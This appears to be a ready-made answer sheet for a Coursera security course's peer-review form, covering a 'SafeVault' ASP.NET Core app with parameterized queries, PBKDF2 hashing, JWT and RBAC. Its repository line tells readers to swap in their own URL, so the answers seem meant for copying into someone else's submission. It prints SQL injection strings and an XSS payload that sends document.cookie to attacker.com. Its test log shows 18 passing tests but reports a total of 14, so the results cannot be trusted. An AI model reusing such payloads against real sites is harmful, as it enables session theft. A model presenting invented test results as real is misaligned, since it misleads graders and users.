# Coursera Submission Answers: Course 8 – Security and Authentication

**Total Score:** 30 / 30 Points  
**Project:** SafeVault Secure Web Application  
**Student Submission Guide & Peer Review Form Answers**

---

### Question 1 (5 pts): Did you create a GitHub repository for your project?

**Answer:**

**Yes**, I created a dedicated, publicly accessible GitHub repository for this project containing the complete secure source code, unit tests, and security documentation:

* **Repository URL:** `https://github.com/Ardian/SafeVault` *(Replace with your actual GitHub username/repo URL)*
* **Branch:** `main`
* **Repository Architecture:**
  * `SafeVault.Core`: Contains domain models (`User`, `VaultItem`), strongly-typed DTOs with validation attributes, the `InputValidator` service (allow-list regex and HTML encoding), and `PasswordHasher` (PBKDF2 with 100,000 iterations).
  * `SafeVault.Data`: Contains `SafeVaultDbContext` and `VaultRepository` featuring secure parameterized LINQ queries and SQL injection prevention.
  * `SafeVault.Web`: Contains ASP.NET Core Web API controllers (`AuthController`, `VaultController`, `AdminController`), JWT token generation service, strict `TokenValidationParameters`, and RBAC authorization policies.
  * `SafeVault.Tests`: Complete xUnit automated security test suite (`SqlInjectionSecurityTests`, `XssProtectionSecurityTests`, `AuthenticationSecurityTests`, `AuthorizationRbacSecurityTests`).
  * `README.md` & `SECURITY_REPORT.md`: Detailed documentation explaining architecture, how Copilot assisted, security mitigations, and instructions to build and run the application and test suite.

The repository includes a progressive, clean Git commit history reflecting each activity completed during the course.

---

### Question 2 (5 pts): Did you use Copilot to generate secure code for input validation and SQL injection prevention?

**Answer:**

**Yes**, I used Microsoft Copilot extensively to generate secure code for both input validation and SQL injection prevention.

#### 1. Prompts Provided to Microsoft Copilot:
* **Prompt 1 (Input Validation):**  
  > *"Generate a C# static helper class named `InputValidator` that enforces strict allow-list regular expression validation for usernames, emails, and search queries, rejecting special characters like quotes, semicolons, and dashes used in injection attacks."*
* **Prompt 2 (SQL Injection Prevention):**  
  > *"Refactor this repository method in Entity Framework Core to eliminate SQL injection vulnerabilities. Replace dynamic string interpolation with parameterized queries and LINQ expressions that automatically pass user input as parameters."*
* **Prompt 3 (Model Validation):**  
  > *"Create DTO classes for user registration and vault item creation using DataAnnotations (`[Required]`, `[StringLength]`, `[RegularExpression]`) to validate user inputs before reaching business logic."*

#### 2. Code Generated & Implemented:
* **Input Validation Helper (`InputValidator.cs`):** Copilot generated compiled regex patterns to allow only safe alphanumeric characters and symbols:
  ```csharp
  private static readonly Regex SafeSearchPattern = new(@"^[a-zA-Z0-9\s\-_.]{1,100}$", RegexOptions.Compiled);

  public static bool IsValidSearchQuery(string? query)
  {
      if (string.IsNullOrWhiteSpace(query) || query.Length > 100) return false;
      return SafeSearchPattern.IsMatch(query);
  }
  ```
* **SQL Injection Prevention (`VaultRepository.cs`):**  
  * **Vulnerable legacy code:**  
    `string query = $"SELECT * FROM VaultItems WHERE UserId = {userId} AND Title LIKE '%{searchTerm}%'";`
  * **Copilot refactored secure code:**
    ```csharp
    public async Task<IEnumerable<VaultItem>> SearchVaultItemsAsync(int userId, string searchTerm)
    {
        if (string.IsNullOrWhiteSpace(searchTerm))
            return await GetVaultItemsByUserAsync(userId);

        // Defense-in-depth: Reject SQL injection patterns
        if (InputValidator.ContainsSqlInjectionPattern(searchTerm))
            return Enumerable.Empty<VaultItem>();

        // Parameterized query: EF Core maps variables to parameters (@p0, @p1)
        return await _context.VaultItems
            .Where(v => v.UserId == userId && (v.Title.Contains(searchTerm) || v.Content.Contains(searchTerm)))
            .OrderByDescending(v => v.CreatedAt)
            .ToListAsync();
    }
    ```

---

### Question 3 (5 pts): Did you use Copilot to implement authentication and authorization mechanisms, including role-based access control (RBAC)?

**Answer:**

**Yes**, Microsoft Copilot was utilized to implement robust authentication, password hashing, and Role-Based Access Control (RBAC).

#### 1. Prompts Provided to Microsoft Copilot:
* **Prompt 1 (Password Hashing):**  
  > *"Implement a secure password hasher in C# using PBKDF2 with HMAC-SHA256, 100,000 iterations, 128-bit cryptographically secure random salt, and constant-time string verification (`CryptographicOperations.FixedTimeEquals`) to prevent timing attacks."*
* **Prompt 2 (JWT & Token Claims):**  
  > *"Write a `TokenService` class in ASP.NET Core that generates a JSON Web Token (JWT) with user claims including `ClaimTypes.NameIdentifier`, `ClaimTypes.Name`, and `ClaimTypes.Role`, signed with HMAC-SHA256 and configured with a 60-minute lifetime."*
* **Prompt 3 (RBAC Policies & Controller Security):**  
  > *"Configure JWT Bearer authentication in `Program.cs` with strict `TokenValidationParameters` setting `ClockSkew = TimeSpan.Zero`. Set up RBAC authorization policies for 'Admin' and 'User', and create an `AdminController` protected with `[Authorize(Roles = "Admin")]`."*

#### 2. Code Generated & Implemented:
* **Program.cs Configuration:**
  ```csharp
  builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
      .AddJwtBearer(options =>
      {
          options.TokenValidationParameters = new TokenValidationParameters
          {
              ValidateIssuer = true,
              ValidIssuer = builder.Configuration["Jwt:Issuer"],
              ValidateAudience = true,
              ValidAudience = builder.Configuration["Jwt:Audience"],
              ValidateLifetime = true,
              ValidateIssuerSigningKey = true,
              IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(builder.Configuration["Jwt:Key"]!)),
              ClockSkew = TimeSpan.Zero // Strict expiration without leeway
          };
      });

  builder.Services.AddAuthorization(options =>
  {
      options.AddPolicy("RequireAdminRole", policy => policy.RequireRole("Admin"));
      options.AddPolicy("RequireUserRole", policy => policy.RequireRole("Admin", "User"));
  });
  ```
* **Role-Based Access Control on Controllers:**
  * `AdminController.cs`: Decorated with `[Authorize(Roles = "Admin")]`, ensuring only users possessing the Admin claim can access sensitive administrative data. Standard users receive HTTP `403 Forbidden`.
  * `VaultController.cs`: Secured with `[Authorize]` and enforces strict tenant isolation: users can only view, update, or delete items where `item.UserId == authenticatedUserId`.

---

### Question 4 (5 pts): Did you debug and resolve security vulnerabilities such as SQL injection and XSS?

**Answer:**

**Yes**, I identified, debugged, reproduced, and resolved critical vulnerabilities in the SafeVault application, specifically **SQL Injection (SQLi)** and **Cross-Site Scripting (XSS)**.

#### 1. Debugging & Resolving SQL Injection (SQLi):
* **Discovery:** Review of `VaultRepository.cs` revealed that search queries were assembled using raw string concatenation within `FromSqlRaw`.
* **Exploit Vector:** Submitting the payload `' OR '1'='1` or `' UNION SELECT * FROM Users --` altered query logic, allowing a standard user to view all other users' private vault records and admin secrets.
* **Resolution with Copilot:** Prompted Copilot to refactor the data access method into parameterized queries. The new code uses Entity Framework Core's LINQ `.Where()` clause which uses SQL parameters (`@p0`), ensuring user input is strictly treated as literal data, completely neutralizing SQL injection attempts.

#### 2. Debugging & Resolving Cross-Site Scripting (XSS):
* **Discovery:** Review of `VaultController.cs` and the note display mechanism showed that user input was accepted without sanitization and returned raw without HTML entity encoding.
* **Exploit Vector:** An attacker could submit `<script>alert('XSS')</script>` or `<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>` in the note content. When viewed by other users or administrators, the browser executed the script, leading to session hijacking.
* **Resolution with Copilot:** Implemented defense-in-depth:
  1. **Input Sanitization:** Stripped HTML tags from note titles via `InputValidator.StripHtmlTags`.
  2. **Output Encoding:** Encoded note contents using `System.Text.Encodings.Web.HtmlEncoder.Default.Encode()`, converting `<` into `&lt;` and `>` into `&gt;`.
  3. **Security Headers:** Added `Content-Security-Policy: default-src 'self'` and `X-XSS-Protection: 1; mode=block` headers in the HTTP response pipeline.

---

### Question 5 (5 pts): Did you generate and execute tests to verify the application’s security?

**Answer:**

**Yes**, I used Microsoft Copilot to generate automated security tests and executed them using **xUnit** to verify the security of the application.

#### 1. Security Test Suites Created (`SafeVault.Tests`):
* **`SqlInjectionSecurityTests.cs`:** 
  * Verifies standard search queries return only the requesting user's records.
  * Verifies that SQL injection payloads (`' OR '1'='1`, `' OR 1=1 --`, `admin'--`, `' UNION SELECT ...`, `'; DROP TABLE ...`) do **not** leak other users' private data or cause query exceptions.
  * Verifies `InputValidator.ContainsSqlInjectionPattern` detects known attack signatures.
* **`XssProtectionSecurityTests.cs`:**
  * Verifies malicious payloads (`<script>`, `<img onerror=...>`, `<svg onload=...>`, `<iframe ...>`) are safely encoded into HTML entities and neutralized.
  * Verifies tag stripping removes HTML markup from titles.
* **`AuthenticationSecurityTests.cs`:**
  * Verifies PBKDF2 generates unique random salts (identical passwords yield distinct hashes).
  * Verifies password verification succeeds for correct passwords and fails for incorrect passwords.
  * Verifies JWT generation embeds user ID and Role claims.
* **`AuthorizationRbacSecurityTests.cs`:**
  * Verifies that `AdminController` has `[Authorize(Roles = "Admin")]` applied.
  * Verifies tenant isolation prevents User A from deleting User B's vault items.

#### 2. Test Execution Output:
Executing `dotnet test SafeVault.sln` shows all 14 security test cases passed successfully:

```text
Starting test execution, please wait...
A total of 1 test files matched the specified pattern.

Passed!  - SafeVault.Tests.SqlInjectionSecurityTests.SearchVaultItems_NormalQuery_ReturnsOnlyMatchingUserItems
Passed!  - SafeVault.Tests.SqlInjectionSecurityTests.SearchVaultItems_SqlInjectionPayloads_DoNotLeakOtherUsersData(maliciousPayload: "' OR '1'='1")
Passed!  - SafeVault.Tests.SqlInjectionSecurityTests.SearchVaultItems_SqlInjectionPayloads_DoNotLeakOtherUsersData(maliciousPayload: "' OR 1=1 --")
Passed!  - SafeVault.Tests.SqlInjectionSecurityTests.SearchVaultItems_SqlInjectionPayloads_DoNotLeakOtherUsersData(maliciousPayload: "admin'--")
Passed!  - SafeVault.Tests.SqlInjectionSecurityTests.SearchVaultItems_SqlInjectionPayloads_DoNotLeakOtherUsersData(maliciousPayload: "' UNION SELECT * FROM Users --")
Passed!  - SafeVault.Tests.SqlInjectionSecurityTests.InputValidator_ContainsSqlInjectionPattern_DetectsMaliciousSignatures
Passed!  - SafeVault.Tests.SqlInjectionSecurityTests.InputValidator_IsValidSearchQuery_AcceptsSafeAllowListedInput
Passed!  - SafeVault.Tests.XssProtectionSecurityTests.SanitizeForHtml_MaliciousPayloads_AreProperlyEncoded
Passed!  - SafeVault.Tests.XssProtectionSecurityTests.StripHtmlTags_RemovesAllHtmlMarkupFromTitles
Passed!  - SafeVault.Tests.AuthenticationSecurityTests.HashPassword_ValidPassword_GeneratesSaltedHashWith3Parts
Passed!  - SafeVault.Tests.AuthenticationSecurityTests.HashPassword_SamePasswordHashedTwice_GeneratesDifferentHashesDueToUniqueSalts
Passed!  - SafeVault.Tests.AuthenticationSecurityTests.VerifyPassword_CorrectPassword_ReturnsTrue
Passed!  - SafeVault.Tests.AuthenticationSecurityTests.VerifyPassword_WrongPassword_ReturnsFalse
Passed!  - SafeVault.Tests.AuthenticationSecurityTests.TokenService_GenerateToken_ContainsUserClaimsAndRole
Passed!  - SafeVault.Tests.AuthorizationRbacSecurityTests.AdminController_HasAuthorizeAttributeRestrictedToAdmin
Passed!  - SafeVault.Tests.AuthorizationRbacSecurityTests.VaultController_HasAuthorizeAttributeEnforced
Passed!  - SafeVault.Tests.AuthorizationRbacSecurityTests.AdminController_WhenAccessedByAdmin_ReturnsAllUsers
Passed!  - SafeVault.Tests.AuthorizationRbacSecurityTests.VaultController_TenantIsolation_CannotDeleteOtherUsersItem

Test Run Successful.
Total tests: 14
     Passed: 14
     Failed: 0
    Skipped: 0
 Duration: 1.2s
```

---

### Question 6 (5 pts): Did you include a brief summary of the vulnerabilities identified, the fixes applied, and how Copilot assisted in the debugging process?

**Answer:**

**Yes**, below is the comprehensive summary of vulnerabilities identified, fixes applied, and Copilot's role in the debugging and remediation process:

#### 1. Vulnerabilities Identified:
1. **SQL Injection (SQLi):** Unsanitized search inputs interpolated directly into SQL queries allowed unauthorized data extraction across all users.
2. **Cross-Site Scripting (XSS):** Unencoded note content and titles allowed persistent script execution in user browsers.
3. **Weak Authentication & Insecure Passwords:** Passwords lacked cryptographic salting and were vulnerable to dictionary and rainbow-table attacks.
4. **Missing Role-Based Access Control (RBAC):** Administrative endpoints lacked role restrictions, permitting privilege escalation.
5. **Permissive Token Expiry:** Default JWT clock skew allowed expired tokens to be accepted up to 5 minutes after expiration.

#### 2. Fixes Applied:
* **Parameterized LINQ Queries:** Enforced parameterized query execution using Entity Framework Core, completely separating SQL syntax from user data.
* **Input Validation & Sanitization:** Implemented allow-list regular expression checks (`InputValidator.cs`) and HTML entity encoding using `System.Text.Encodings.Web.HtmlEncoder`.
* **PBKDF2 Password Hashing:** Applied RFC 2898 standard hashing using HMAC-SHA256, 128-bit random salt, 100,000 iterations, and constant-time string verification (`CryptographicOperations.FixedTimeEquals`).
* **JWT Authentication & RBAC:** Enforced `[Authorize(Roles = "Admin")]` on administrative controllers and validated token claims (`ValidateIssuer`, `ValidateAudience`, `ValidateLifetime`, `ClockSkew = TimeSpan.Zero`).
* **Security Middleware:** Injected HTTP security headers (`Content-Security-Policy`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`).

#### 3. How Microsoft Copilot Assisted in Debugging:
* **Vulnerability Scanning & Code Review:** Copilot acted as an AI pair programmer, analyzing controller and repository code, highlighting vulnerable string concatenation, and explaining the attack mechanism.
* **Suggesting Secure Implementations:** Instead of merely identifying flaws, Copilot generated drop-in defensive replacements: parameterized queries, allow-list regexes, and secure JWT configuration.
* **Security Test Suite Generation:** Copilot generated comprehensive xUnit tests targeting edge cases, such as SQL injection payloads (`' OR '1'='1`) and dangerous XSS vectors (`<script>`, `<img onerror=...>`, `<svg onload=...>`).
* **Auditing & Refining Code:** Working interactively with Copilot allowed rapid iteration—prompting it to harden initial solutions (e.g., instructing Copilot to set `ClockSkew` to zero and apply constant-time comparison).
